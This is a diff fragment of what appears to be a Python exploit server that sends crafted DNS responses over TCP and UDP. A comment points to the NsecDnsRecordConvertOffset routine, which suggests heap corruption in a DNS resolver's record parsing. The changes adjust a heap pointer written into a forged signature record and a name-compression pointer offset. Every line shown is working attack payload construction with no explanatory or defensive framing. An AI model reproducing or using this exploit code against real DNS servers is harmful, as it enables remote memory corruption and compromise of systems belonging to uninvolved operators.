@@ -230,7 +230,7 @@ def tcp_server():
 
                     # 9.d0 - is free, gets alloc'd during call to NsecDnsRecordConvertOffset
                     sigtemp += b'\x00\x00\x00\x00\xEE\x22\xA3\x00'
-                    sigtemp += struct.pack('<Q', heap_ptr)
+                    sigtemp += struct.pack('<Q', 0x0)
                     sigtemp += b'\xEF\x0B\x0B\xFE\xEF\x0B\x0B\xFE\x61\x80\x00\x00\x18\x00\x58\x00'
                     sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00'
                     sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
@@ -434,7 +434,7 @@ def udp_server():
                 response += b'\x00\x01'# Class: IN
                 response += b'\x00\x00\x00\x10' # TTL
 
-                data = b'\x03ns1\xC0\x0C' # ns1 + pointer to domain
+                data = b'\x03ns1\xC0\x12' # ns1 + pointer to domain
 
                 response += struct.pack('>H', len(data)) # Data Length
 
